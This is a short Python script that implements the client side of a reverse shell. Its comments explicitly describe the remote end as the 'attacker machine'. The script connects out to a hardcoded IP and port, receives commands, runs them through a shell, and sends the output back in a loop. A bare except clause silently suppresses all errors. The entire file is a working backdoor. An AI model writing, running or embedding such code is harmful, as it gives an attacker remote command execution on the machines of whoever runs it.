import socket
import os
import subprocess


# A typical sequence of a socket connection (client side):

# 1. - Create socket
# 2. - Connect to socket at server address
# 3. - Instruct the OS to receive and send data.
# 4. - Close Socket when it is not needed any longer.


# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        # Replace host and port with host and port of attacker machine (host and port you entered in server.py)
        host = '192.168.178.27'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))


# Receive commands from remote server and run on local machine
# Then send back the output
# Close socket if received command is quit
def commands():
    global s
    while True:
        data = s.recv(16384).decode("utf-8")
        if data[:2] == 'cd':
            os.chdir(data[3:])
        if len(data) > 0:
            if data == 'quit':
                s.close()
                os._exit(0)
            else:
                cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))

try:
    socket_create()
    socket_connect()
    commands()
except:
    pass